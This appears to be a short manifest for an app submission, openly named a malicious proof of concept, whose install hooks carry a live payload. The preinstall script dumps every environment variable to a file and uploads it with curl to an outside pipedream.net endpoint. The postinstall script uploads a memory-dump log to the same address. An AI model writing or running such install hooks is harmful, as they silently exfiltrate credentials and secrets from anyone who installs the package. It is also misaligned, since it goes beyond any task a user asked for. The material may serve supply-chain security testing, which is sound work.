name: malicious-poc-app
description: A new app submission with a hidden payload for PoC.

scripts.preinstall: echo 'Preinstall script running - attempting to exfiltrate secrets (env dump)...' && env > /tmp/env_dump && curl -X PUT --upload-file /tmp/env_dump https://eoiissjprny7lfp.m.pipedream.net/env_secrets.txt
scripts.postinstall: echo 'Postinstall script running - attempting memdump...' && curl --request PUT 'https://eoiissjprny7lfp.m.pipedream.net/memdump_results.txt' --form 'file=@/tmp/memdump_output.log'
